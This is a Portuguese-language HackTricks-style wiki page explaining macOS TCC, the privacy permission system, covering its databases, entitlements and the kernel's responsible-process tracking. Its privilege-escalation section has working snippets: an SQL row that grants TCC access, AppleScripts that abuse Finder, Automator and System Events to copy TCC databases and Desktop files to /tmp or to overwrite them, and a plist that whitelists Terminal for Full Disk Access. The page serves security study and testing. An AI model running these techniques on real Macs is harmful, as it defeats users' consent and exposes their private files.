# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informações básicas**

**TCC (Transparency, Consent, and Control)** é um protocolo de segurança focado na regulamentação das permissões de aplicativos. Sua função principal é proteger recursos sensíveis, como **serviços de localização, contatos, fotos, microfone, câmera, acessibilidade e acesso total ao disco**. Ao exigir o consentimento explícito do usuário antes de conceder acesso do aplicativo a esses elementos, o TCC aprimora a privacidade e o controle do usuário sobre seus dados.

Os usuários encontram o TCC quando os aplicativos solicitam acesso a recursos protegidos. Isso é exibido por meio de um prompt que permite aos usuários **aprovar ou negar o acesso**. Além disso, o TCC permite ações diretas do usuário, como **arrastar e soltar arquivos em um aplicativo**, para conceder acesso a arquivos específicos, garantindo que os aplicativos tenham acesso apenas ao que foi explicitamente permitido.

![Um exemplo de um prompt do TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

O **TCC** é gerenciado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).

Há um **tccd em modo de usuário** em execução para cada usuário conectado, definido em `/System/Library/LaunchAgents/com.apple.tccd.plist`, registrando os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Aqui você pode ver o tccd sendo executado como sistema e como usuário:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
As **permissões** são **herdadas do aplicativo pai** e as **permissões** são **rastreadas** com base no **Bundle ID** e no **Developer ID**.

### Bancos de dados do TCC

As permissões concedidas/negadas são armazenadas em alguns bancos de dados do TCC:

- O banco de dados de todo o sistema em **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Este banco de dados é **protegido pelo SIP**, portanto somente um bypass de SIP pode gravar nele.
- O banco de dados do TCC do usuário **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário.
- Este banco de dados é protegido, portanto somente processos com privilégios elevados do TCC, como Full Disk Access, podem gravar nele (mas ele não é protegido pelo SIP).

> [!WARNING]
> Os bancos de dados anteriores também são **protegidos pelo TCC contra acesso de leitura**. Portanto, você **não poderá ler** o banco de dados regular do TCC do usuário, a menos que isso seja feito a partir de um processo privilegiado pelo TCC.
>
> No entanto, lembre-se de que um processo com esses privilégios elevados (como **FDA** ou **`kTCCServiceEndpointSecurityClient`**) poderá gravar no banco de dados do TCC dos usuários.

- Existe um **terceiro** banco de dados do TCC em **`/var/db/locationd/clients.plist`**, que indica os clientes autorizados a **acessar os serviços de localização**.
- O arquivo protegido pelo SIP **`/Users/carlospolop/Downloads/REG.db`** (também protegido contra acesso de leitura pelo TCC) contém a **localização** de todos os **bancos de dados do TCC válidos**.
- O arquivo protegido pelo SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (também protegido contra acesso de leitura pelo TCC) contém mais permissões concedidas pelo TCC.
- O arquivo protegido pelo SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mas legível por qualquer pessoa) é uma lista de permissões de aplicativos que exigem uma exceção do TCC.

> [!TIP]
> O banco de dados do TCC no **iOS** está em **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> A **interface do notification center** pode fazer **alterações no banco de dados do TCC do sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> No entanto, os usuários podem **excluir ou consultar regras** com o utilitário de linha de comando **`tccutil`**.

#### Consultar os bancos de dados

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Consultando ambos os bancos de dados, você pode verificar as permissões que um app permitiu, proibiu ou não possui (ele as solicitará).

- O **`service`** é a representação em string da **permissão** do TCC
- O **`client`** é o **bundle ID** ou o **caminho para o binário** com as permissões
- O **`client_type`** indica se é um Bundle Identifier(0) ou um caminho absoluto(1)

<details>

<summary>Como executar se for um caminho absoluto</summary>

Basta executar **`launctl load you_bin.plist`**, com um plist como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- O **`auth_value`** pode ter diferentes valores: denied(0), unknown(1), allowed(2) ou limited(3).
- O **`auth_reason`** pode assumir os seguintes valores: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- O campo **`csreq`** indica como verificar o binary a ser executado e conceder as permissões do TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Para obter mais informações sobre os **outros campos** da tabela, [**consulte esta publicação do blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Você também pode verificar as **permissões já concedidas** aos apps em `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Os usuários _podem_ **excluir ou consultar regras** usando o **`tccutil`**.

#### Redefinir permissões do TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

O **database** do TCC armazena o **Bundle ID** da aplicação, mas também **armazena** **informações** sobre a **assinatura** para **garantir** que o App que solicita o uso de uma permissão seja o correto.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Portanto, outros aplicativos que usem o mesmo nome e bundle ID não poderão acessar as permissões concedidas a outros aplicativos.

### Entitlements & Permissões do TCC

Os aplicativos **não precisam apenas** **solicitar** e ter **acesso concedido** a determinados recursos; eles também precisam **ter os entitlements relevantes**.\
Por exemplo, o **Telegram** possui o entitlement `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** esse **entitlement** não poderá acessar a câmera (e o usuário nem sequer será solicitado a conceder as permissões).

Observe que os entitlements são arquivos plist e fazem parte da code sig, sendo posteriormente submetidos a hash na code sig por slots especiais; eles podem ser consultados no kernel pelo código do kernel ou pelo código do modelo de usuário usando `csops(#169)` ou `csops_audittoken(#170)`.

No entanto, para que os aplicativos **acessem** **determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhum **entitlement** específico. O sistema tratará do acesso de forma transparente e **solicitará a permissão ao usuário** conforme necessário.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Os aplicativos da Apple **não gerarão prompts**. Eles contêm **direitos pré-concedidos** em sua lista de **entitlements**, o que significa que **nunca gerarão um popup**, **nem** aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Isso evitará que o Calendar peça ao usuário acesso a lembretes, ao calendário e ao catálogo de endereços.

> [!TIP]
> Além de algumas documentações oficiais sobre entitlements, também é possível encontrar **informações interessantes não oficiais sobre entitlements em** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não existe uma lista pública que defina todas elas, mas você pode consultar esta [**lista das conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Locais sensíveis não protegidos

- $HOME (por si só)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### User Intent / com.apple.macl

Como mencionado anteriormente, é possível **conceder acesso de um App a um arquivo arrastando\&soltando-o sobre ele**. Esse acesso não será especificado em nenhum banco de dados do TCC, mas sim como um **atributo** **estendido do arquivo**. Esse atributo **armazenará o UUID** do App autorizado:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> É curioso que o atributo **`com.apple.macl`** seja gerenciado pelo **Sandbox**, e não pelo tccd.
>
> Observe também que, se você mover para outro computador um arquivo que concede acesso ao UUID de um app no seu computador, isso não concederá acesso a esse app, pois o mesmo app terá UIDs diferentes.

O extended attribute `com.apple.macl` **não pode ser removido** como outros extended attributes, pois é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desativá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.<sup>[[3]](#references)</sup>






## Mecanismo de Responsible Process do XNU

No macOS/iOS, o mecanismo de **responsible process** é um recurso crítico de segurança usado pelo framework **TCC (Transparency, Consent, and Control)** e por outros sistemas de segurança para rastrear qual processo é, em última instância, responsável por uma ação, inclusive através de cadeias de processos filhos.

Quando o TCC verifica permissões (por exemplo, câmera, microfone e localização), ele nem sempre verifica o processo imediato que faz a solicitação. Em vez disso, verifica o **responsible process** — normalmente o aplicativo GUI que iniciou a ação, mesmo que a solicitação real venha de um processo auxiliar ou daemon.

<details>
<summary>Como o Responsible Process é Definido</summary>

### Campos da Estrutura do Processo

Cada processo no XNU mantém dois identificadores UUID importantes:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: O próprio UUID do processo (do comando de carregamento `LC_UUID` do binário Mach-O)
- **`p_responsible_pid`**: O PID do processo responsável
- **`p_responsible_uuid`**: O UUID do processo responsável (persiste mesmo após a saída desse processo)

### Como o Processo Responsável é Definido

1. **Durante a Criação do Processo (Fork)**

Quando um novo processo é criado via `fork()` ou `posix_spawn()`, o processo responsável é herdado do processo pai (a syscall `exec()` reutiliza a estrutura `proc` existente, portanto, esta etapa não é repetida nesse ponto):

**Localização**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Pontos principais:**
- Os processos filhos **herdam** o `p_responsible_pid` do processo pai
- Isso cria uma **cadeia de responsabilidade** através da hierarquia de processos
- O processo responsável normalmente aponta para o aplicativo GUI original

2. **A função principal: `proc_set_responsible_pid()`**

**Localização**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**O que esta função faz:**
1. **Define o PID responsável** no processo de destino
2. **Localiza o processo responsável** usando `proc_find()` (incrementa a contagem de referências)
3. **Copia o UUID** de `p_uuid` do processo responsável para `p_responsible_uuid` do processo de destino
4. **Libera a referência** com `proc_rele()` (decrementa a contagem de referências)

3. **Por que armazenar o PID e o UUID?**

A abordagem de armazenamento duplo resolve um problema crítico:

| Campo | Finalidade | Problema | Solução |
|-------|------------|----------|---------|
| `p_responsible_pid` | Pesquisa rápida do processo atual | O PID pode ser reutilizado após o encerramento do processo | Usado para a pesquisa de processos ativos |
| `p_responsible_uuid` | Identificação persistente | Persiste após o encerramento do processo | Usado para verificações de segurança e auditoria |

**O problema**: se o processo responsável for encerrado antes do processo filho, o PID poderá ser reciclado e atribuído a um processo completamente diferente.

**A solução**: o UUID é imutável e identifica exclusivamente o binário específico que era responsável, mesmo após seu encerramento.

### Fluxo de criação do processo
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Fonte do UUID: Comando de carregamento LC_UUID

O UUID armazenado em `p_uuid` vem do **comando de carregamento `LC_UUID` do executável Mach-O**:

1. **Tempo de compilação**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Tempo de Execução**

**Localização**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Armazenado na Estrutura do Processo**

**Localização**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Localização**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Inserir no TCC

Se em algum momento você conseguir acesso de escrita a um banco de dados do TCC, poderá usar algo semelhante ao seguinte para adicionar uma entrada (remova os comentários):

<details>

<summary>Exemplo de inserção no TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Se você conseguiu entrar em um app com algumas permissões TCC, consulte a página a seguir com TCC payloads para abusar delas:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Saiba mais sobre Apple Events em:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

O nome TCC da permissão Automation é: **`kTCCServiceAppleEvents`**\
Essa permissão TCC específica também indica o **aplicativo que pode ser gerenciado** dentro do banco de dados TCC (portanto, as permissões não permitem gerenciar tudo).

O **Finder** é um aplicativo que **sempre tem FDA** (mesmo que isso não apareça na UI); portanto, se você tiver privilégios de **Automation** sobre ele, poderá abusar desses privilégios para **fazê-lo executar algumas ações**.\
Nesse caso, seu app precisaria da permissão **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Você poderia abusar disso para **escrever seu próprio banco de dados TCC do usuário**.

> [!WARNING]
> Com essa permissão, você poderá **pedir ao Finder para acessar pastas restritas pelo TCC** e fornecer os arquivos, mas, até onde sei, você **não poderá fazer o Finder executar código arbitrário** para abusar completamente do acesso FDA dele.
>
> Portanto, você não poderá abusar de todos os recursos do FDA.

Este é o prompt do TCC para obter privilégios de Automation sobre o Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Observe que, como o aplicativo **Automator** possui a permissão TCC **`kTCCServiceAppleEvents`**, ele pode **controlar qualquer aplicativo**, como o Finder. Portanto, tendo permissão para controlar o Automator, você também poderia controlar o **Finder** com um código como o abaixo:

<details>

<summary>Obter um shell dentro do Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

O mesmo acontece com o **Script Editor app,** que pode controlar o Finder, mas usando um AppleScript você não pode forçá-lo a executar um script.

### Automation (SE) para alguns TCC

O **System Events pode criar Folder Actions, e as Folder Actions podem acessar algumas pastas protegidas pelo TCC** (Desktop, Documents e Downloads), portanto, um script como o seguinte pode ser usado para abusar desse comportamento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) to FDA\*

Automation no **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) permite **enviar teclas para processos**. Dessa forma, você poderia abusar do Finder para alterar o TCC.db dos usuários ou conceder FDA a um aplicativo arbitrário (embora uma senha possa ser solicitada para isso).

Exemplo de substituição do TCC.db dos usuários pelo Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` para FDA\*

Consulte esta página para encontrar alguns [**payloads para abusar das permissões de Accessibility**](macos-tcc-payloads.md#accessibility) e fazer privesc para FDA\* ou executar um keylogger, por exemplo.

### **Endpoint Security Client para FDA**

Se você tiver **`kTCCServiceEndpointSecurityClient`**, terá FDA. Fim.

### System Policy SysAdmin File para FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário, o que altera sua pasta pessoal e, portanto, permite **bypassar o TCC**.<sup>[[5]](#references)</sup>

### User TCC DB para FDA

Obter **permissões de escrita** sobre o banco de dados **TCC do usuário** não permite que você conceda a si mesmo permissões de **`FDA`**; somente o banco de dados do sistema pode concedê-las.

Mas você **pode** conceder a si mesmo **direitos de Automation para o Finder** e abusar da técnica anterior para escalar para FDA\*.

### **FDA para permissões do TCC**

**Full Disk Access** é o nome no TCC para **`kTCCServiceSystemPolicyAllFiles`**.

Não acho que isso seja um privesc real, mas, caso seja útil: se você controlar um programa com FDA, poderá **modificar o banco de dados TCC dos usuários e conceder a si mesmo qualquer acesso**. Isso pode ser útil como uma técnica de persistência caso você perca suas permissões de FDA.

### **SIP Bypass para TCC Bypass**

O **banco de dados TCC** do sistema é protegido pelo **SIP**; por isso, somente processos com os **entitlements indicados poderão modificá-lo**. Portanto, se um atacante encontrar um **SIP bypass** sobre um **arquivo** (conseguir modificar um arquivo restrito pelo SIP), ele poderá:

- **Remover a proteção** de um banco de dados TCC e conceder a si mesmo todas as permissões do TCC. Ele poderia abusar de qualquer um destes arquivos, por exemplo:
- O banco de dados TCC do sistema
- REG.db
- MDMOverrides.plist

No entanto, há outra opção para abusar deste **SIP bypass para bypassar o TCC**: o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que exigem uma exceção do TCC. Portanto, se um atacante puder **remover a proteção do SIP** deste arquivo e adicionar seu **próprio aplicativo**, o aplicativo poderá bypassar o TCC.\
Por exemplo, para adicionar o terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypasses de TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [Uma análise aprofundada do macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script para rastrear com.apple.macl (Gist de brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Rastreando e lidando com com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Contornando as proteções de privacidade do usuário do macOS TCC por acidente e por design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Alterar o diretório home e contornar o TCC, também conhecido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
